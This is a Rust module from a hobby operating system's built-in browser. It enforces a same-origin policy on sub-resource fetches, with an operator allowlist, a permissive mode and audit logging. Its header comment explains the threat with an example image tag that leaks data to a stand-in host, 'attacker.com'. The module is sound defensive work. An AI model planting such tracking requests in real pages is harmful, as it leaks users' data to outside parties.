// Bat_OS — origin tracker + same-origin policy enforcement.
//
// Sprint 2.2 / STUMP #104. The renderer fetches the main HTML page,
// then walks the DOM looking for sub-resources to fetch:
//   - <link rel="stylesheet" href="...">
//   - <img src="...">
//   - (eventually <script src="...">, <iframe>, fetch() in JS)
//
// Without same-origin policy enforcement, a page from origin A can
// embed `<img src="https://attacker.com/track?...">` which causes the
// renderer to make an outbound HTTPS request to attacker.com carrying
// any URL-encoded info A wants to leak. This is the single
// highest-impact attack the kernel-level browser is exposed to.
//
// SOP: when fetching a sub-resource, compare the resource's origin
// (scheme + host + port) to the main page's origin. If different,
// reject — unless the operator has explicitly allowlisted the cross-
// origin pair via `origin-allow <main> <other>`.
//
// Pre-pivot Sprint 2.2 was scoped as "per-origin BatCaves" — full
// process-level isolation per origin. That's architecturally
// expensive in this codebase (every fetch would close all TCP,
// reset DNS, wipe the JS engine via reset_all_globals_for_cave_switch).
// SOP enforcement gives most of the security with a fraction of the
// cost. Full per-origin caves can land later as a deeper refactor.

#![allow(dead_code)]

use core::sync::atomic::{AtomicBool, Ordering};
use crate::drivers::uart;

/// Origin = scheme + host + port. We compare these byte-for-byte;
/// no normalization beyond what `parse_url` already does.
#[derive(Clone, Copy)]
pub struct Origin {
    pub scheme: [u8; 8],
    pub scheme_len: u8,
    pub host:   [u8; 128],
    pub host_len: u16,
    pub port:   u16,
    pub valid:  bool,
}

impl Origin {
    pub const fn empty() -> Self {
        Origin {
            scheme: [0; 8],
            scheme_len: 0,
            host: [0; 128],
            host_len: 0,
            port: 0,
            valid: false,
        }
    }

    pub fn matches(&self, other: &Origin) -> bool {
        if !self.valid || !other.valid { return false; }
        if self.scheme_len != other.scheme_len { return false; }
        if &self.scheme[..self.scheme_len as usize]
            != &other.scheme[..other.scheme_len as usize] { return false; }
        if self.host_len != other.host_len { return false; }
        if &self.host[..self.host_len as usize]
            != &other.host[..other.host_len as usize] { return false; }
        self.port == other.port
    }

    pub fn from_url(url: &str) -> Self {
        let mut o = Self::empty();
        let parsed = match crate::net::fetch::parse_url(url) {
            Some(p) => p,
            None => return o,
        };
        let (scheme, host, port, _path) = parsed;
        let sb = scheme.as_bytes();
        let sn = sb.len().min(o.scheme.len());
        o.scheme[..sn].copy_from_slice(&sb[..sn]);
        o.scheme_len = sn as u8;
        let hb = host.as_bytes();
        let hn = hb.len().min(o.host.len());
        o.host[..hn].copy_from_slice(&hb[..hn]);
        o.host_len = hn as u16;
        o.port = port;
        o.valid = true;
        o
    }

    pub fn write_to(&self, out: &mut [u8]) -> usize {
        let mut p = 0;
        let scheme = &self.scheme[..self.scheme_len as usize];
        let host = &self.host[..self.host_len as usize];
        let copy = |dst: &mut [u8], src: &[u8], p: &mut usize| {
            let n = src.len().min(dst.len().saturating_sub(*p));
            dst[*p..*p + n].copy_from_slice(&src[..n]);
            *p += n;
        };
        copy(out, scheme, &mut p);
        copy(out, b"://", &mut p);
        copy(out, host, &mut p);
        let default_port = match self.scheme_len {
            5 => 443, // https
            4 => 80,  // http
            _ => 0,
        };
        if self.port != default_port && self.port != 0 {
            copy(out, b":", &mut p);
            let mut tmp = [0u8; 8];
            let mut v = self.port as usize;
            let mut i = 0;
            while v > 0 && i < tmp.len() { tmp[i] = b'0' + (v % 10) as u8; v /= 10; i += 1; }
            if i == 0 { copy(out, b"0", &mut p); }
            else { for j in 0..i { let b = [tmp[i - 1 - j]]; copy(out, &b, &mut p); } }
        }
        p
    }
}

/// The origin of the main document the renderer is currently
/// painting. Set by `set_main_origin` when cmd_render starts a fresh
/// page; cleared by `clear_main_origin` (currently unused — we just
/// overwrite each render).
static mut MAIN_ORIGIN: Origin = Origin::empty();

/// Hard-fail the renderer when SOP is violated? Default true.
/// `origin-mode permissive` flips to false (logs but allows).
static SOP_ENFORCE: AtomicBool = AtomicBool::new(true);

/// Allowlist of (main, other) origin pairs the operator has marked
/// as safe. Implemented as a small ring; the host-scope is just the
/// host string so http vs https against the same host is one entry.
const ALLOWLIST_CAP: usize = 32;
#[derive(Clone, Copy)]
struct AllowEntry {
    pub main_host: [u8; 128],
    pub main_host_len: u16,
    pub other_host: [u8; 128],
    pub other_host_len: u16,
    pub active: bool,
}
impl AllowEntry {
    const fn empty() -> Self {
        AllowEntry {
            main_host: [0; 128], main_host_len: 0,
            other_host: [0; 128], other_host_len: 0,
            active: false,
        }
    }
}
static mut ALLOWLIST: [AllowEntry; ALLOWLIST_CAP] = [AllowEntry::empty(); ALLOWLIST_CAP];

pub fn set_main_origin(url: &str) {
    let new_origin = Origin::from_url(url);
    unsafe {
        let p = core::ptr::addr_of_mut!(MAIN_ORIGIN);
        let prev = core::ptr::read(p);
        core::ptr::write(p, new_origin);
        if prev.valid && !prev.matches(&new_origin) {
            let mut buf = [0u8; 192];
            let mut bp = 0;
            let copy = |dst: &mut [u8], src: &[u8], bp: &mut usize| {
                let n = src.len().min(dst.len().saturating_sub(*bp));
                dst[*bp..*bp + n].copy_from_slice(&src[..n]);
                *bp += n;
            };
            copy(&mut buf, b"main origin -> ", &mut bp);
            bp += new_origin.write_to(&mut buf[bp..]);
            crate::security::audit::record(
                crate::security::audit::Category::Nav,
                &buf[..bp],
            );
        }
    }
}

pub fn clear_main_origin() {
    unsafe { core::ptr::write(core::ptr::addr_of_mut!(MAIN_ORIGIN), Origin::empty()); }
}

pub fn current_main_origin() -> Origin {
    unsafe { core::ptr::read(core::ptr::addr_of!(MAIN_ORIGIN)) }
}

pub fn is_strict() -> bool { SOP_ENFORCE.load(Ordering::Relaxed) }
pub fn set_strict(v: bool) { SOP_ENFORCE.store(v, Ordering::Relaxed); }

/// Check a sub-resource fetch against SOP. Returns Ok if allowed,
/// Err if rejected. Audit-logs every cross-origin attempt (allowed
/// or rejected) so post-incident review can spot exfiltration.
pub fn check_subresource(url: &str) -> Result<(), &'static str> {
    let main = current_main_origin();
    if !main.valid { return Ok(()); } // No main origin set → freely allowed
    let sub = Origin::from_url(url);
    if !sub.valid { return Ok(()); }   // Bad URL → caller will fail anyway
    if main.matches(&sub) { return Ok(()); }

    // Cross-origin. Check allowlist.
    let main_host = unsafe { &main.host[..main.host_len as usize] };
    let sub_host  = unsafe { &sub.host[..sub.host_len as usize] };
    let allowed = unsafe {
        let list = &*core::ptr::addr_of!(ALLOWLIST);
        list.iter().any(|e| {
            e.active
                && &e.main_host[..e.main_host_len as usize] == main_host
                && &e.other_host[..e.other_host_len as usize] == sub_host
        })
    };

    let mut buf = [0u8; 192];
    let mut p = 0;
    let copy = |dst: &mut [u8], src: &[u8], p: &mut usize| {
        let n = src.len().min(dst.len().saturating_sub(*p));
        dst[*p..*p + n].copy_from_slice(&src[..n]);
        *p += n;
    };
    copy(&mut buf, if allowed { b"X-origin ALLOW " } else { b"X-origin BLOCK " }, &mut p);
    p += main.write_to(&mut buf[p..]);
    copy(&mut buf, b" -> ", &mut p);
    p += sub.write_to(&mut buf[p..]);
    crate::security::audit::record(
        crate::security::audit::Category::Fetch,
        &buf[..p],
    );

    if allowed {
        Ok(())
    } else if is_strict() {
        Err("SOP: cross-origin fetch blocked (origin-allow to whitelist)")
    } else {
        uart::puts("  [origin] WARN cross-origin fetch (permissive mode, allowed)\n");
        Ok(())
    }
}

/// Add an entry to the allowlist. Idempotent — a duplicate add is a no-op.
pub fn allow(main_host: &str, other_host: &str) -> Result<(), &'static str> {
    unsafe {
        let mh = main_host.as_bytes();
        let oh = other_host.as_bytes();
        let list = &mut *core::ptr::addr_of_mut!(ALLOWLIST);
        for e in list.iter() {
            if e.active
                && &e.main_host[..e.main_host_len as usize] == mh
                && &e.other_host[..e.other_host_len as usize] == oh
            {
                return Ok(());
            }
        }
        for e in list.iter_mut() {
            if !e.active {
                let mn = mh.len().min(e.main_host.len());
                e.main_host[..mn].copy_from_slice(&mh[..mn]);
                e.main_host_len = mn as u16;
                let on = oh.len().min(e.other_host.len());
                e.other_host[..on].copy_from_slice(&oh[..on]);
                e.other_host_len = on as u16;
                e.active = true;
                return Ok(());
            }
        }
        Err("origin-allow: allowlist full")
    }
}

pub fn dump_allowlist() {
    let mut count = 0;
    unsafe {
        let list = &*core::ptr::addr_of!(ALLOWLIST);
        for e in list.iter() {
            if !e.active { continue; }
            uart::puts("  ");
            let mh = core::str::from_utf8_unchecked(&e.main_host[..e.main_host_len as usize]);
            let oh = core::str::from_utf8_unchecked(&e.other_host[..e.other_host_len as usize]);
            uart::puts(mh);
            uart::puts(" -> ");
            uart::puts(oh);
            uart::puts("\n");
            count += 1;
        }
    }
    if count == 0 {
        uart::puts("  (allowlist is empty)\n");
    }
}

pub fn clear_allowlist() {
    unsafe {
        let list = &mut *core::ptr::addr_of_mut!(ALLOWLIST);
        for e in list.iter_mut() { *e = AllowEntry::empty(); }
    }
}
